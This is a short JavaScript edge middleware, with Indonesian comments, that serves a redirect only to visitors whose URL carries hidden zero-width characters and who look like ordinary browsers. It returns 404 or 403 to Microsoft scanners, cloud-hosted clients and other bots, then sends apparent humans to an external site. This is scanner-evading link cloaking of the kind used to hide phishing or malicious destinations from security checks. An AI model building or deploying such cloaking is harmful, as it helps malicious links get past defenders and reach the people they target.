export default function middleware(req) {
  const url = new URL(req.url);
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  const ip = req.headers.get('x-forwarded-for') || req.ip || '';
  
  // 1. DETEKSI KUNCI GAIB (ZWC)
  const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodeURIComponent(url.pathname));
  if (!hasZwc && url.pathname === '/') {
     return new Response('404 Not Found', { status: 404 });
  }

  // 2. BLOCK DATA CENTER & SERVER (Filter buat Microsoft/Azure)
  // Bot tadi (135.232.19.45) terdeteksi sebagai 'MICROSOFT' di log kamu.
  const botIsps = ['microsoft', 'azure', 'amazon', 'aws', 'google cloud', 'digitalocean', 'hetzner', 'choopa', 'ovh'];
  const isServerIp = botIsps.some(isp => ua.includes(isp)); 
  
  // Tambahan: Bot Microsoft sering mengirim header khusus 'x-ms-...'
  const isMicrosoftBot = req.headers.has('x-ms-useragent') || ua.includes('office') || ua.includes('microsoft');

  if (isServerIp || isMicrosoftBot) {
    console.log(`🚫 BLOCK DATA CENTER: IP=${ip} | UA=${ua}`);
    return new Response('403 Forbidden', { status: 403 });
  }

  // 3. FINGERPRINTING MANUSIA (Standar Browser)
  const hasAcceptLang = req.headers.has('accept-language'); 
  const isMobile = /iphone|ipad|android/.test(ua);
  const isDesktop = /windows|macintosh|linux/.test(ua);

  // 4. VALIDASI AKHIR
  if (ua.length < 40 || !hasAcceptLang || (!isMobile && !isDesktop)) {
    return new Response('Error 403', { status: 403 });
  }

  // 5. SUCCESS REDIRECT
  const targetUrl = 'https://nusaindahrp.com/?dev';
  return new Response(
    `<html><head><meta http-equiv="refresh" content="0;url=${targetUrl}"></head><body><script>window.location.href="${targetUrl}"</script></body></html>`,
    {
      status: 200,
      headers: { 'Content-Type': 'text/html' }
    }
  );
}
